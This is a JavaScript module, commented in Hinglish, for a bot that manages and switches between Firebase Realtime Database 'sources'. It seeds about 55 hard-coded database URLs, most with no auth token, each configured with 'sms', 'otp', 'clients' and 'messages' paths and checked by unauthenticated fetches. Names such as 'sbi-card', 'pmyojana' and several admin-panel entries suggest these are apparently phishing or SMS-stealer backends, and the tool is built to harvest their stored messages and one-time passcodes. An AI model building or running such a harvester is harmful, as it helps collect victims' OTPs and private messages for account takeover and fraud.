// ===== 🔥 FIREBASE SOURCES — dynamic, bot UI se manage =====
//
// User ki AZADI: ek se zyada Firebase databases add karo, unhe enable/
// disable karo, active switch karo — sab bot UI se (env nahi chhedni padti).
//
// Storage: data/db.json → db.firebaseSources = { activeId, list: [...] }
//   source = { id, name, url, auth?, clientsPath?, messagesPath?,
//              numbersPath?, smsPath?, otpPath?, enabled, addedAt }
//
// Default: agar list khali hai to env FIREBASE_DB_URL (ya vuvhbjbi default)
// se ek "Default" source seed hota hai — pehla run bina setup ke chalta hai.
//
// applyActiveSource() — active source ko reader (firebase-numbers.js) par
// set karta hai; batch/start se PEHLE aur switch/ADD ke TURANT baad call ho.

import crypto from 'crypto';
import { getDb, saveDb } from './store.js';
import { setFirebaseSource } from './firebase-numbers.js';

const DEFAULT_URL = 'https://vuvhbjbi-default-rtdb.firebaseio.com/';

// Owner ke diye hue Firebase DBs — pehli baar is seed-version ke saath bot
// chalne par ye sab Settings → Firebase Sources me auto-add ho jate hain.
// seedVersion save rehta hai, isliye baad me koi source delete karne par
// woh restart par zabardasti wapas nahi aata.
const BUILTIN_SEED_VERSION = 1;
export const BUILTIN_FIREBASE_SOURCE_URLS = [
  'https://admin143-dab82-default-rtdb.firebaseio.com',
  'https://albart-new-feed-default-rtdb.firebaseio.com',
  'https://allahmohammad-5f389-default-rtdb.firebaseio.com',
  'https://amar-47591-default-rtdb.firebaseio.com',
  'https://asry-84be8-default-rtdb.firebaseio.com',
  'https://bewafa-f42d3-default-rtdb.firebaseio.com',
  'https://bhoto-f503f-default-rtdb.firebaseio.com',
  'https://boka-d0c13-default-rtdb.firebaseio.com',
  'https://chod-patti-default-rtdb.firebaseio.com',
  'https://choduu00111-default-rtdb.firebaseio.com',
  'https://cufutfutg-default-rtdb.firebaseio.com',
  'https://devilpanel-c8e3e-default-rtdb.firebaseio.com',
  'https://faizybro-default-rtdb.firebaseio.com',
  'https://fdfmnb-91c13-default-rtdb.firebaseio.com',
  'https://master80221-753fb-default-rtdb.firebaseio.com',
  'https://mr-ansari-f8e1e-default-rtdb.asia-southeast1.firebasedatabase.app',
  'https://myypppp-default-rtdb.asia-southeast1.firebasedatabase.app',
  'https://noidaa-dda60-default-rtdb.firebaseio.com',
  'https://odabu-91972-default-rtdb.firebaseio.com',
  'https://pablo-57b21-default-rtdb.firebaseio.com',
  'https://panel-4aa3d-default-rtdb.firebaseio.com',
  'https://penal-a93a8-default-rtdb.firebaseio.com',
  'https://pmyojana-7621e-default-rtdb.firebaseio.com',
  'https://robin-60398-default-rtdb.firebaseio.com',
  'https://rohitxpro-767b2-default-rtdb.firebaseio.com',
  'https://romdas-903d3-default-rtdb.firebaseio.com',
  'https://ronaak-admin-panel-default-rtdb.firebaseio.com',
  'https://roy11-3bc9e-default-rtdb.firebaseio.com',
  'https://roya-admin-default-rtdb.firebaseio.com',
  'https://rupesh-6c5e5-default-rtdb.firebaseio.com',
  'https://sale5-e588d-default-rtdb.firebaseio.com',
  'https://sallu-9934f-default-rtdb.firebaseio.com',
  'https://saluu-dcb00-default-rtdb.firebaseio.com',
  'https://samsan-d4bda-default-rtdb.firebaseio.com',
  'https://sanj-683c4-default-rtdb.firebaseio.com',
  'https://sbi-card-c24ef-default-rtdb.firebaseio.com',
  'https://taaaar-f97b6-default-rtdb.firebaseio.com',
  'https://tabuna-4e962-default-rtdb.firebaseio.com',
  'https://taniya-setup-panel-default-rtdb.firebaseio.com',
  'https://terimaakichut-ce92d-default-rtdb.firebaseio.com',
  'https://tinku-152d3-default-rtdb.firebaseio.com',
  'https://unknown-5b51e-default-rtdb.firebaseio.com',
  'https://ttitj-fe9b5-default-rtdb.firebaseio.com',
  'https://vfxhj-9accf-default-rtdb.firebaseio.com',
  'https://vault-29e76-default-rtdb.firebaseio.com',
  'https://vhjhfhjgjy-default-rtdb.firebaseio.com',
  'https://vikashhhh-default-rtdb.firebaseio.com',
  'https://vivov-df9bb-default-rtdb.firebaseio.com',
  'https://vishnu-cha-1-default-rtdb.firebaseio.com',
  'https://westsidestory-1334f-default-rtdb.firebaseio.com',
  'https://webfund3-default-rtdb.firebaseio.com',
  'https://dhoni-ji-default-rtdb.firebaseio.com',
  'https://dk-panel-default-rtdb.firebaseio.com',
  'https://do-admin-v13-default-rtdb.firebaseio.com',
  'https://do-admin-v21-default-rtdb.firebaseio.com',
];

function normalizeSourceUrl(url) {
  return String(url || '').trim().replace(/\/+$/, '').toLowerCase();
}

function builtinSourceName(url) {
  try {
    return new URL(url).hostname
      .split('.')[0]
      .replace(/-default-rtdb$/i, '')
      .slice(0, 40) || 'Firebase';
  } catch {
    return 'Firebase';
  }
}

function newSourceId(state) {
  const used = new Set((state?.list || []).map((s) => s.id));
  let id = '';
  do { id = crypto.randomUUID().slice(0, 8); } while (used.has(id));
  return id;
}

function loadState() {
  const db = getDb();
  if (!db.firebaseSources || typeof db.firebaseSources !== 'object') {
    db.firebaseSources = { activeId: '', list: [] };
  }
  if (!Array.isArray(db.firebaseSources.list)) db.firebaseSources.list = [];
  return db.firebaseSources;
}

function persist(state) {
  const db = getDb();
  db.firebaseSources = state;
  saveDb(db);
}

// Pehli baar list khali ho to env/default se seed + owner-ki built-in list
// ek dafa merge karo. Active source nahi badalta — naye sources enabled
// rehte hain aur user Settings se kisi ko bhi ACTIVE kar sakta hai.
export function ensureSeeded() {
  const state = loadState();
  let changed = false;

  if (!state.list.length) {
    const url = String(process.env.FIREBASE_DB_URL || DEFAULT_URL).trim();
    const src = {
      id: newSourceId(state),
      name: 'Default (vuvhbjbi)',
      url: url.replace(/\/+$/, ''),
      auth: String(process.env.FIREBASE_DB_AUTH || '').trim(),
      clientsPath: String(process.env.FIREBASE_CLIENTS_PATH || 'clients').trim(),
      messagesPath: String(process.env.FIREBASE_MESSAGES_PATH || 'messages').trim(),
      numbersPath: '',
      smsPath: 'sms',
      otpPath: 'otp',
      enabled: true,
      addedAt: new Date().toISOString(),
    };
    state.list.push(src);
    state.activeId = src.id;
    changed = true;
  }

  if ((Number(state.seedVersion) || 0) < BUILTIN_SEED_VERSION) {
    const knownUrls = new Set(state.list.map((s) => normalizeSourceUrl(s.url)));
    const addedAt = new Date().toISOString();
    for (const url of BUILTIN_FIREBASE_SOURCE_URLS) {
      const key = normalizeSourceUrl(url);
      if (knownUrls.has(key)) continue;
      state.list.push({
        id: newSourceId(state),
        name: builtinSourceName(url),
        url,
        auth: '',
        clientsPath: 'clients',
        messagesPath: 'messages',
        numbersPath: '',
        smsPath: 'sms',
        otpPath: 'otp',
        enabled: true,
        builtin: true,
        addedAt,
      });
      knownUrls.add(key);
    }
    state.seedVersion = BUILTIN_SEED_VERSION;
    changed = true;
  }

  if (!state.activeId || !state.list.some((s) => s.id === state.activeId)) {
    const first = state.list.find((s) => s.enabled) || state.list[0];
    state.activeId = first?.id || '';
    changed = true;
  }

  if (changed) persist(state);
  return state;
}

export function listSources() {
  const state = ensureSeeded();
  return state.list.map((s) => ({ ...s, active: s.id === state.activeId }));
}

export function getActiveSource() {
  const state = ensureSeeded();
  return state.list.find((s) => s.id === state.activeId && s.enabled)
    || state.list.find((s) => s.enabled)
    || null;
}

export function getSource(id) {
  const state = ensureSeeded();
  const src = state.list.find((s) => s.id === id) || null;
  return src ? { ...src, active: src.id === state.activeId } : null;
}

function validateSourceInput({ name, url, auth, clientsPath, messagesPath, numbersPath, smsPath, otpPath }) {
  const cleanUrl = String(url || '').trim().replace(/\/+$/, '');
  if (!/^https:\/\/[a-z0-9-]+\.firebaseio\.com$/i.test(cleanUrl) &&
      !/^https:\/\/[a-z0-9.-]+\.firebasedatabase\.app$/i.test(cleanUrl)) {
    return { ok: false, error: 'URL valid Firebase Realtime DB hona chahiye — jaise https://xxxx-default-rtdb.firebaseio.com/' };
  }
  return {
    ok: true,
    src: {
      name: String(name || '').trim().slice(0, 40) || cleanUrl.replace('https://', '').split('.')[0],
      url: cleanUrl,
      auth: String(auth || '').trim(),
      clientsPath: String(clientsPath || 'clients').trim(),
      messagesPath: String(messagesPath || 'messages').trim(),
      numbersPath: String(numbersPath || '').trim(),
      smsPath: String(smsPath || 'sms').trim(),
      otpPath: String(otpPath || 'otp').trim(),
    },
  };
}

export function addSource(input, { activate = true } = {}) {
  const v = validateSourceInput(input);
  if (!v.ok) return v;
  const state = ensureSeeded();
  if (state.list.some((s) => normalizeSourceUrl(s.url) === normalizeSourceUrl(v.src.url))) {
    return { ok: false, error: 'Ye URL pehle se added hai.' };
  }
  const src = {
    id: newSourceId(state),
    ...v.src,
    enabled: true,
    addedAt: new Date().toISOString(),
  };
  state.list.push(src);
  if (activate || !getActiveSource()) state.activeId = src.id;
  persist(state);
  if (src.id === state.activeId) applyActiveSource(); // reader par turant apply
  return { ok: true, source: { ...src, active: src.id === state.activeId } };
}

export function removeSource(id) {
  const state = ensureSeeded();
  const idx = state.list.findIndex((s) => s.id === id);
  if (idx === -1) return { ok: false, error: 'Source nahi mila.' };
  if (state.list.length === 1) return { ok: false, error: 'Aakhri source delete nahi ho sakta — pehle naya add karein.' };
  state.list.splice(idx, 1);
  if (state.activeId === id) {
    const next = state.list.find((s) => s.enabled) || state.list[0];
    state.activeId = next ? next.id : '';
  }
  persist(state);
  applyActiveSource();
  return { ok: true };
}

export function setActiveSource(id) {
  const state = ensureSeeded();
  const src = state.list.find((s) => s.id === id);
  if (!src) return { ok: false, error: 'Source nahi mila.' };
  if (!src.enabled) return { ok: false, error: 'Source disabled hai — pehle enable karein.' };
  state.activeId = id;
  persist(state);
  applyActiveSource();
  return { ok: true, source: { ...src, active: true } };
}

export function toggleSource(id) {
  const state = ensureSeeded();
  const src = state.list.find((s) => s.id === id);
  if (!src) return { ok: false, error: 'Source nahi mila.' };
  if (src.enabled && src.id === state.activeId) {
    const others = state.list.filter((s) => s.enabled && s.id !== id);
    if (!others.length) return { ok: false, error: 'Kam se kam ek enabled source chahiye.' };
  }
  src.enabled = !src.enabled;
  if (!src.enabled && src.id === state.activeId) {
    const next = state.list.find((s) => s.enabled);
    state.activeId = next ? next.id : '';
  }
  persist(state);
  applyActiveSource();
  return { ok: true, enabled: src.enabled };
}

// Active source ko reader par apply (boot par + switch par)
export function applyActiveSource() {
  const src = getActiveSource();
  setFirebaseSource(src); // null = env fallback
  return src;
}

// Naya source add karte hi turant test — user ko feedback mile
export async function verifySource(id) {
  const src = getSource(id);
  if (!src) return { ok: false, error: 'Source nahi mila.' };
  const url = `${src.url}/.json?shallow=true${src.auth ? `&auth=${encodeURIComponent(src.auth)}` : ''}`;
  try {
    const t0 = Date.now();
    const res = await fetch(url, { signal: AbortSignal.timeout(10_000) });
    const ms = Date.now() - t0;
    if (!res.ok) {
      const txt = await res.text().catch(() => '');
      return { ok: false, error: `HTTP ${res.status} ${txt.slice(0, 100)}` };
    }
    const json = await res.json().catch(() => null);
    const topKeys = json && typeof json === 'object' ? Object.keys(json).slice(0, 8) : [];
    return { ok: true, ms, topKeys };
  } catch (e) {
    return { ok: false, error: e?.message || 'network error' };
  }
}
